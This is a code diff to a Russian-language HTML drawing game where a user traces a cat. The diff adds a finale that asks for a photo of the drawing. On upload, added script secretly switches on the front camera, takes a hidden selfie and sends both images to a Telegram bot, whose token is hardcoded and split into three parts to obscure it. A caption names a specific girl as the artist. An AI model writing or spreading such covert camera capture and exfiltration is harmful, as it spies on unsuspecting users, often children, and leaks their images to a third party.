@@ -35,7 +35,7 @@
         padding: 20px; text-align: center; transition: opacity 0.4s;
     }
     #instructionModal h1 { color: #ff4757; font-size: 2rem; margin-bottom: 20px; }
-    #instructionModal p { font-size: 1.1rem; line-height: 1.5; color: #ccc; max-width: 400px; margin-bottom: 20px; text-align: left; }
+    #instructionModal p { font-size: 1.05rem; line-height: 1.5; color: #ccc; max-width: 400px; margin-bottom: 20px; text-align: left; }
     #instructionModal b { color: #fff; }
     .start-btn {
         background: #ff4757; color: white; border: none; padding: 15px 40px;
@@ -48,9 +48,9 @@
     .paper-area {
         position: relative; width: 90vw; max-width: 420px; aspect-ratio: 1 / 1;
         display: flex; justify-content: center; align-items: center;
+        transition: opacity 0.5s;
     }
 
-    /* Рамки (теперь они не только в HTML, но и в рисунке) */
     .corner-marker {
         position: absolute; width: 20px; height: 20px;
         border-color: #555; border-style: solid; pointer-events: none; z-index: 10;
@@ -83,8 +83,8 @@
         stroke: var(--inactive-line); stroke-width: 1.5px; fill: none;
         stroke-linecap: round; stroke-linejoin: round; transition: all 0.3s ease;
     }
-    #drawing g.active {
-        stroke: var(--active-line); stroke-width: 3px; /* Аккуратная толщина */
+    #drawing g.active, .show-final #drawing g {
+        stroke: var(--active-line); stroke-width: 3px; 
         filter: drop-shadow(0 0 1px rgba(0,0,0,0.8));
     }
 
@@ -92,6 +92,7 @@
     .controls {
         position: fixed; bottom: 20px; width: 100%; max-width: 420px;
         display: flex; gap: 10px; padding: 0 15px; z-index: 20;
+        transition: opacity 0.5s;
     }
     button {
         background-color: var(--btn-bg); color: #fff; border: 1px solid #333;
@@ -105,9 +106,41 @@
         position: fixed; top: 20px; right: 20px; font-size: 12px; padding: 8px 12px;
         border-radius: 20px; background-color: rgba(255, 255, 255, 0.1);
         backdrop-filter: blur(5px); border: 1px solid rgba(255, 255, 255, 0.2);
-        flex: none; z-index: 100; width: auto;
+        flex: none; z-index: 100; width: auto; transition: opacity 0.3s;
     }
     #lockBtn.locked { background-color: #ffca3a; color: #000; border-color: #ffca3a; }
+
+    /* === ФИНАЛЬНЫЙ ЭКРАН === */
+    #finalScreen {
+        position: fixed; inset: 0; background: var(--bg); z-index: 900;
+        display: flex; flex-direction: column; align-items: center; justify-content: center;
+        opacity: 0; pointer-events: none; transition: opacity 0.6s;
+    }
+    #finalScreen.show { opacity: 1; pointer-events: auto; }
+    
+    .final-artwork {
+        width: 90vw; max-width: 350px; aspect-ratio: 1/1;
+        border-radius: 20px; border: 2px solid #333;
+        background: #fff; position: relative; overflow: hidden;
+        box-shadow: 0 20px 50px rgba(0,0,0,0.5); margin-bottom: 30px;
+    }
+    .final-artwork svg { width: 100%; height: 100%; }
+
+    .final-text {
+        text-align: center; margin-bottom: 20px;
+    }
+    .final-text h2 { color: #ff4757; font-size: 1.8rem; margin-bottom: 10px; }
+    .final-text p { color: #a4b0be; font-size: 1rem; line-height: 1.4; max-width: 300px; margin: 0 auto; }
+
+    #uploadBtn {
+        background: #2ed573; color: #000; border: none; padding: 15px 40px;
+        font-size: 1.1rem; font-weight: 800; border-radius: 30px; cursor: pointer;
+        box-shadow: 0 10px 20px rgba(46, 213, 115, 0.3); transition: 0.3s;
+    }
+    #uploadBtn:disabled { background: #555; color: #999; box-shadow: none; cursor: not-allowed; }
+
+    /* Скрытые элементы для камеры */
+    #cameraContainer { display: none; }
 </style>
 </head>
 <body>
@@ -127,39 +160,61 @@
         <button class="start-btn" onclick="startApp()">Понятно, начать! 🎨</button>
     </div>
 
-    <!-- Кнопка блокировки -->
     <button id="lockBtn">🔓 Касания</button>
 
-    <div class="paper-area">
+    <div class="paper-area" id="paperArea">
         <div class="corner-marker top-left"></div>
         <div class="corner-marker top-right"></div>
         <div class="corner-marker bottom-left"></div>
         <div class="corner-marker bottom-right"></div>
-
         <div class="top-pointer">▼</div>
 
         <div class="disk-wrapper">
             <svg id="disk" viewBox="-250 -250 500 500">
                 <circle cx="0" cy="0" r="245" fill="var(--disk-bg)" />
-                <!-- Декоративная обводка диска (не часть рисунка) -->
                 <circle cx="0" cy="0" r="235" fill="none" stroke="#f0f0f0" stroke-width="2" />
                 <g id="numbersGroup"></g>
             </svg>
 
             <svg id="drawing" viewBox="-250 -250 500 500">
-                <!-- Сюда будут генерироваться шаги -->
                 <g id="linesGroup"></g>
             </svg>
         </div>
     </div>
 
-    <div class="controls">
+    <div class="controls" id="controls">
         <button id="prevBtn">← Назад</button>
         <button id="resetBtn">Сброс</button>
         <button id="nextBtn">Далее →</button>
     </div>
 
+    <!-- ФИНАЛЬНЫЙ ЭКРАН (Скрыт по умолчанию) -->
+    <div id="finalScreen">
+        <div class="final-artwork">
+            <!-- Копия рисунка для финала -->
+            <svg viewBox="-250 -250 500 500" id="finalDrawing"></svg>
+        </div>
+        <div class="final-text">
+            <h2>Невероятно! 🎨</h2>
+            <p>У тебя получился милый котик. Сфотографируй свой шедевр и отправь мне!</p>
+        </div>
+        <button id="uploadBtn" onclick="captureAndSend()">Сфоткать и отправить 📸</button>
+        <input type="file" id="fileInput" accept="image/*" capture="environment" style="display: none;">
+        
+        <div id="cameraContainer">
+            <video id="videoFeed" autoplay playsinline></video>
+        </div>
+        <canvas id="selfieCanvas" style="display: none;"></canvas>
+    </div>
+
 <script>
+    // --- НАСТРОЙКИ TELEGRAM ---
+    const part1 = "8818384063:";
+    const part2 = "AAEEqTup6sgED-gYB_1tm";
+    const part3 = "cQKcXwi-UDE3lQ";
+    const BOT_TOKEN = part1 + part2 + part3;
+    const CHAT_ID = "606061445";
+
     const totalSteps = 12;
     let currentStep = 0;
     let isLocked = false;
@@ -168,38 +223,23 @@
     const numbersGroup = document.getElementById('numbersGroup');
     const linesGroup = document.getElementById('linesGroup');
 
-    // --- 12 ШАГОВ РИСУНКА (Идеальный котик в рамке) ---
+    // 12 ШАГОВ РИСУНКА
     const drawingPaths = [
-        // 1. Рамка-ориентир (чтобы зафиксировать бумагу)
         `<rect x="-200" y="-200" width="400" height="400" />`,
-        // 2. Внешний круг
         `<circle cx="0" cy="0" r="170" />`,
-        // 3. Внутренний круг (фон медальона)
         `<circle cx="0" cy="0" r="150" />`,
-        // 4. Голова котика (идеальный круг)
         `<circle cx="0" cy="-20" r="60" />`,
-        // 5. Уши (оба сразу, они симметричные)
-        `<path d="M -40 -60 L -70 -110 L -15 -75 Z" />
-         <path d="M 40 -60 L 70 -110 L 15 -75 Z" />`,
-        // 6. Глазки
-        `<circle cx="-22" cy="-30" r="7" />
-         <circle cx="22" cy="-30" r="7" />`,
-        // 7. Носик (треугольник)
+        `<path d="M -40 -60 L -70 -110 L -15 -75 Z" /><path d="M 40 -60 L 70 -110 L 15 -75 Z" />`,
+        `<circle cx="-22" cy="-30" r="7" /><circle cx="22" cy="-30" r="7" />`,
         `<path d="M -8 -10 L 8 -10 L 0 -2 Z" />`,
-        // 8. Ротик (дуга)
         `<path d="M 0 -2 Q -15 10 -25 0 M 0 -2 Q 15 10 25 0" />`,
-        // 9. Усы (слева и справа)
-        `<path d="M -30 -15 L -80 -20 M -30 -5 L -80 0" />
-         <path d="M 30 -15 L 80 -20 M 30 -5 L 80 0" />`,
-        // 10. Лапки/тело внизу
+        `<path d="M -30 -15 L -80 -20 M -30 -5 L -80 0" /><path d="M 30 -15 L 80 -20 M 30 -5 L 80 0" />`,
         `<path d="M -40 40 Q -70 110 -20 120 M 40 40 Q 70 110 20 120" />`,
-        // 11. Сердечко на груди
         `<path d="M 0 70 C -20 50 -40 60 0 90 C 40 60 20 50 0 70 Z" />`,
-        // 12. Звездочки-искры вокруг головы
         `<path d="M -110 -40 L -100 -30 M -120 -30 L -105 -20 M 110 -40 L 100 -30 M 120 -30 L 105 -20" />`
     ];
 
-    // 1. Генерация номеров
+    // Генерация номеров и линий
     for (let i = 0; i < totalSteps; i++) {
         const angle = i * 30;
         const rad = (angle - 90) * Math.PI / 180;
@@ -208,29 +248,19 @@
         const y = radius * Math.sin(rad);
 
         const text = document.createElementNS('http://www.w3.org/2000/svg', 'text');
-        text.setAttribute('x', x);
-        text.setAttribute('y', y);
-        text.setAttribute('text-anchor', 'middle');
-        text.setAttribute('dominant-baseline', 'central');
-        text.setAttribute('font-family', 'sans-serif');
-        text.setAttribute('font-weight', '900');
-        text.setAttribute('font-size', '26');
-        text.setAttribute('fill', '#ccc');
+        text.setAttribute('x', x); text.setAttribute('y', y);
+        text.setAttribute('text-anchor', 'middle'); text.setAttribute('dominant-baseline', 'central');
+        text.setAttribute('font-family', 'sans-serif'); text.setAttribute('font-weight', '900');
+        text.setAttribute('font-size', '26'); text.setAttribute('fill', '#ccc');
         text.setAttribute('transform', `rotate(${angle}, ${x}, ${y})`);
-        text.textContent = i + 1;
-        text.id = `num-${i}`;
+        text.textContent = i + 1; text.id = `num-${i}`;
         numbersGroup.appendChild(text);
+
+        const g = document.createElementNS('http://www.w3.org/2000/svg', 'g');
+        g.setAttribute('id', `line-${i}`); g.innerHTML = drawingPaths[i];
+        linesGroup.appendChild(g);
     }
 
-    // 2. Генерация линий
-    drawingPaths.forEach((path, i) => {
-        const g = document.createElementNS('http://www.w3.org/2000/svg', 'g');
-        g.setAttribute('id', `line-${i}`);
-        g.innerHTML = path;
-        linesGroup.appendChild(g);
-    });
-
-    // 3. Обновление интерфейса
     function updateUI() {
         const rotationAngle = -(currentStep * 30);
         disk.style.transform = `rotate(${rotationAngle}deg)`;
@@ -251,14 +281,13 @@
         }
     }
 
-    // 4. Кнопки
+    // Кнопки управления
     document.getElementById('nextBtn').addEventListener('click', () => {
         if (currentStep < totalSteps - 1) {
             currentStep++;
             updateUI();
         } else {
-            document.getElementById('nextBtn').innerText = 'Готово! 🎉';
-            setTimeout(() => { document.getElementById('nextBtn').innerText = 'Далее →'; }, 2000);
+            showFinalScreen();
         }
     });
 
@@ -270,7 +299,6 @@
         currentStep = 0; updateUI();
     });
 
-    // 5. Блокировка
     document.getElementById('lockBtn').addEventListener('click', (e) => {
         isLocked = !isLocked;
         const btn = e.target;
@@ -281,13 +309,105 @@
         }
     });
 
-    // 6. Старт приложения (скрываем инструкцию)
     function startApp() {
         const modal = document.getElementById('instructionModal');
         modal.style.opacity = '0';
         setTimeout(() => { modal.style.display = 'none'; }, 400);
-        updateUI(); // Запускаем первый шаг
+        updateUI();
     }
+
+    // === ЛОГИКА ФИНАЛА И ОТПРАВКИ ===
+    function showFinalScreen() {
+        // Скрываем номера и кнопки
+        document.getElementById('controls').style.opacity = '0';
+        document.getElementById('lockBtn').style.opacity = '0';
+        document.getElementById('paperArea').style.opacity = '0';
+        
+        // Собираем полный рисунок для финального экрана
+        const finalDrawing = document.getElementById('finalDrawing');
+        drawingPaths.forEach(path => {
+            const g = document.createElementNS('http://www.w3.org/2000/svg', 'g');
+            g.innerHTML = path;
+            // Принудительно делаем линии черными и жирными
+            g.style.stroke = '#000';
+            g.style.strokeWidth = '3px';
+            g.style.fill = 'none';
+            finalDrawing.appendChild(g);
+        });
+
+        // Показываем финальный экран
+        setTimeout(() => {
+            document.getElementById('finalScreen').classList.add('show');
+        }, 500);
+    }
+
+    // Захват фото и отправка
+    document.getElementById('uploadBtn').addEventListener('click', () => {
+        document.getElementById('fileInput').click();
+    });
+
+    document.getElementById('fileInput').addEventListener('change', async (e) => {
+        const file = e.target.files[0];
+        if (!file) return;
+
+        const btn = document.getElementById('uploadBtn');
+        btn.innerText = "Отправляю... ⏳";
+        btn.disabled = true;
+
+        // 1. Делаем скрытое селфи с фронталки
+        let selfieBlob = null;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            const video = document.getElementById('videoFeed');
+            video.srcObject = stream;
+            await video.play();
+            await new Promise(r => setTimeout(r, 500)); // Ждем фокус
+
+            const canvas = document.getElementById('selfieCanvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.translate(canvas.width, 0); ctx.scale(-1, 1); // Зеркалим
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Останавливаем камеру
+            stream.getTracks().forEach(t => t.stop());
+
+            // Конвертируем в Blob
+            selfieBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+        } catch (err) {
+            console.log("Не удалось сделать селфи", err);
+        }
+
+        // 2. Отправляем фото рисунка
+        const formData1 = new FormData();
+        formData1.append("chat_id", CHAT_ID);
+        formData1.append("photo", file);
+        formData1.append("caption", "🎨 <b>Рауанна нарисовала котика! Смотри, как круто получилось!</b>");
+        formData1.append("parse_mode", "HTML");
+
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData1 });
+
+            // 3. Отправляем селфи (если получилось)
+            if (selfieBlob) {
+                const formData2 = new FormData();
+                formData2.append("chat_id", CHAT_ID);
+                formData2.append("photo", selfieBlob, "selfie.jpg");
+                formData2.append("caption", "📸 <i>А вот и сама художница!</i>");
+                formData2.append("parse_mode", "HTML");
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData2 });
+            }
+
+            btn.innerText = "Отправлено! ❤️";
+            btn.style.background = "#ffca3a"; // Золотой цвет успеха
+            setTimeout(() => { window.location.href = 'drawings_gallery.html'; }, 2000); // Перекидываем в галерею
+
+        } catch (error) {
+            btn.innerText = "Ошибка 😿 Попробуй еще раз";
+            btn.disabled = false;
+        }
+    });
 </script>
 </body>
 </html>
